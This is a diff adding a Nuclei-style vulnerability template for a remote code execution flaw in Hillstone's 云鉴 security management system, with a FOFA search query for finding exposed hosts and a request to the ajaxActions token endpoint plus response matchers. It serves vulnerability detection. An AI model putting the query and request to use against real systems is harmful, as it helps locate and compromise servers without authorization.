@@ -1,0 +1,26 @@
+id: hillstone-rce
+
+info:
+  name: "山石网科云鉴 ajaxActions 接口远程代码执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body=山石云鉴主机安全管理系统||icon_hash="572290418"
+          山石网科云鉴安全管理系统 ajaxActions 接口存在远程代码执行缺陷，潜在威胁行为者可通过该漏洞执行任意系统命令，进而实现对目标服务器的未授权访问及敏感数据泄露。
+  tags: 山石网科云鉴安全管理系统
+
+http:
+- raw:
+  - |
+    GET /master/ajaxActions/getTokenAction.php HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: PHPSESSID=2333333333333;
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "'(\\w*)'"
